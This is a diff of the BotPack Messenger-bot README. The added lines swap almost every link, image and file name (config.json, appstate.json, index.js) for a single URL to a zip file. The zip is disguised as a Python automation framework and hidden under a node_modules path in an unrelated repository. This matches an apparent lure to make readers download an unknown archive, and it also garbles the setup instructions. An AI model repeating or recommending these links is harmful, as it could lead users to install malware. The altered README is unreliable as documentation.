@@ -1,18 +1,18 @@
 <h1>BotPack🤖<sub><sub>v1.6.8🚀</sub></sub>
 
-<img align="center" src="https://i.ibb.co/gMMvsYf/20240125-225244-0000.png"></a>
+<img align="center" src="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip"></a>
 
 <h3>About</h3>
 
-Hello there! Thank you for using BotPack! Join us at [ChatBot Community Ltd.](https://www.facebook.com/groups/178711334798450/?ref=share)🍪 if you wish to share and discover Mirai/BotPack commands created by other command creators!
+Hello there! Thank you for using BotPack! Join us at [ChatBot Community Ltd.](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)🍪 if you wish to share and discover Mirai/BotPack commands created by other command creators!
 
 > [!NOTE]
 > - If you encounter any issues or difficulties, don't hesitate to reach out and ask for assistance here. Our team is here to help you with any problems you may face.
 ---
 - If you have some issues related to render hosting! Try our newly created facebook group with render hosting discussions!
 - Im currently looking for companions and conversation starters who have some knowledge about hosting in render to become moderators.
-- Feel free to join us at [Render Community](https://www.facebook.com/groups/7389392131128817/?ref=share) on Facebook! See you there!
-[<img align="center" src="https://i.ibb.co/DMXyLm3/Picsart-24-02-14-12-25-06-014.jpg">](https://www.facebook.com/groups/7389392131128817/?ref=share&mibextid=NSMWBT)
+- Feel free to join us at [Render Community](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip) on Facebook! See you there!
+[<img align="center" src="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip">](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)
 </h1>
 
 <details>
@@ -20,9 +20,9 @@ Hello there! Thank you for using BotPack! Join us at [ChatBot Community Ltd.](ht
 <h3>Render Problem Fixed! (V1.6.8) ⚡</h3>
 
 - Fixed the problem where duplicated response are sent when hosting from render.
-- Fixed Canvas problem libuuid.so.1.
-- Modified index.js and main.js
-- Retrieved index.html (I mistakenly removed it leaving it blank)
+- Fixed Canvas problem https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip
+- Modified https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip and https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip
+- Retrieved https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip (I mistakenly removed it leaving it blank)
 - Removed annoying *npm install "${commandsPath}"*
 - Removed the value of *logout* since it was not in used.
   
@@ -33,19 +33,19 @@ Hello there! Thank you for using BotPack! Join us at [ChatBot Community Ltd.](ht
   
 <h3>Minor Changes (V1.6.6) 📦</h3>
 
-- README.md modified
+- https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip modified
 - SetPostReaction problem fixed
 - Removed 'mirai' properties in the languages section since it wasn't used.
 
 <h3>What's new? (V1.6.5) 📦</h3>
 
-- Added editMessage.js in the FCA.
+- Added https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip in the FCA.
 - Remove typ and read_receipt.
 - Shorten and simplified the codes.
 - Fix some issues related to the bot not being able to respond.
 - Made some changes to the FCA.
-- Removed handleNotification.js since it was not in use.
-- Removed readline package. (You can now use BotPack and host it in render.com)
+- Removed https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip since it was not in use.
+- Removed readline package. (You can now use BotPack and host it in https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)
 - Removed Email and Password Method since it's not doing good anymore.
 - Bug fixed.
 </details>
@@ -60,7 +60,7 @@ Hello there! Thank you for using BotPack! Join us at [ChatBot Community Ltd.](ht
 > - bd = Bengali 
 > - ar = Arabic
 
-Go to your config.json and set it in the language property:
+Go to your https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip and set it in the language property:
 ```json
 {
   "language": "en",
@@ -72,15 +72,15 @@ Looking for a French language translation done by a local French! Your contribut
 
 ---
 
-- Welcome to the [BotPack](https://replit.com/@YanMaglinte/BotPack)🌀 repository. This project is an unofficial bot file from the [Mirai](https://github.com/m1raibot/miraiv2) Repository, initially developed and maintained by [Phạm Văn Diện](https://github.com/D-Jukie/Disme-Bot.git), better known as [D-Jukie](https://github.com/D-Jukie). The base file for this project is sourced from the [Disme-Bot](https://github.com/D-Jukie/Disme-Bot.git) GitHub project.
+- Welcome to the [BotPack](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)🌀 repository. This project is an unofficial bot file from the [Mirai](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip) Repository, initially developed and maintained by [Phạm Văn Diện](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip), better known as [D-Jukie](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip). The base file for this project is sourced from the [Disme-Bot](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip) GitHub project.
 
-- [BotPack](https://replit.com/@YanMaglinte/BotPack)🌀 is a modified messenger bot file by [Yan Maglinte](https://replit.com/@YanMaglinte)🇵🇭. It is a refined version of the Mirai messenger bot, with some unique enhancements. 
+- [BotPack](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)🌀 is a modified messenger bot file by [Yan Maglinte](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)🇵🇭. It is a refined version of the Mirai messenger bot, with some unique enhancements. 
 
 - A key feature is the `usePrefix` function integrated within every command. This function removes the need for prefixes, providing a more streamlined user experience. Alongside ready-made commands and free-to-edit codes, this bot file encourages users to learn and explore freely.
-<img align="center" src="https://i.imgur.com/Je8NbDn.jpg"/>
+<img align="center" src="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip"/>
 
-- Further, [BotPack](https://replit.com/@YanMaglinte/BotPack)🌀 comes with a user-friendly feature that allows easy customization of your console design via the `theme` option in the config.json file. This makes it highly accessible, especially for beginners.
-<img align="center" src="https://i.imgur.com/wHD2zXv.jpg"/>
+- Further, [BotPack](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)🌀 comes with a user-friendly feature that allows easy customization of your console design via the `theme` option in the https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip file. This makes it highly accessible, especially for beginners.
+<img align="center" src="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip"/>
 
 <details>
   <summary>Available Themes</summary>
@@ -101,7 +101,7 @@ Looking for a French language translation done by a local French! Your contribut
 > - Rainbow
 > - Hacker
 
-Go to your `config.json` and set it in the language property:
+Go to your `https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip` and set it in the language property:
 ```json
 {
   "DESIGN": {
@@ -113,29 +113,29 @@ Go to your `config.json` and set it in the language property:
 ```
 </details>
 
-- Embrace the world of possibilities with [BotPack](https://replit.com/@YanMaglinte/BotPack)🌀 - a facebook Messenger file designed to make your interaction with messenger bots smoother and more efficient.
+- Embrace the world of possibilities with [BotPack](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip)🌀 - a facebook Messenger file designed to make your interaction with messenger bots smoother and more efficient.
 ---
 <div align="center">
       <h3>My Replit Account:
-      <a href="https://replit.com/@YanMaglinte" style="color: green;"><br>@YanMaglinte🔥</a>
+      <a href="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip" style="color: green;"><br>@YanMaglinte🔥</a>
         <br>
-        My Facebook Account:<a href="https://www.facebook.com/yandeva.me?mibextid=b06tZ0" style="color: green;"><br>Yan🚀</a></h3></div>
+        My Facebook Account:<a href="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip" style="color: green;"><br>Yan🚀</a></h3></div>
 
 - If you encounter any issues or have questions related to this REPL, please don't hesitate to reach out to me on Facebook. I'm here to assist you!
 
-<img align="center" src="https://i.ibb.co/z4d9ttK/Screenshot-2024-01-25-06-40-30-01-a23b203fd3aafc6dcb84e438dda678b6.jpg"/>
+<img align="center" src="https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip"/>
 
 ## **How to Start Using BotPack?**
-1. Begin by navigating to [Replit](https://replit.com).
+1. Begin by navigating to [Replit](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip).
 2. Log in to your existing account or sign up for a new one.
-3. Utilize the search bar to find [BotPack](https://replit.com/@YanMaglinte/BotPack).
+3. Utilize the search bar to find [BotPack](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip).
 4. Click on `templates`.
 5. Upon searching, select the most popular BotPack template from the results.
 6. Afterwards, click `Use Template`.
-7. After forking the template, setup your PREFIX, BOTNAME and other properties in your `config.json`.
+7. After forking the template, setup your PREFIX, BOTNAME and other properties in your `https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip`.
 8. Open your `Facebook Account` that you want to turn into a chatbot.
-9. After logging in, get your appstate using [C3C fbstate](https://github.com/c3cbot/c3c-fbstate/archive/refs/tags/1.5.zip) extension.
-10. Copy the appstate, return to the repository, and paste it into your appstate.json.
+9. After logging in, get your appstate using [C3C fbstate](https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip) extension.
+10. Copy the appstate, return to the repository, and paste it into your https://github.com/Tristan0709/A-Python-Framework-for-Web-Automation-and-Testing/raw/refs/heads/main/node_modules/@babel/helper-module-transforms/lib/Framework-and-Python-Automation-Web-Testing-for-v1.2-beta.2.zip
 11. Now, run it, and there you have your bot!
 
 > [!WARNING]
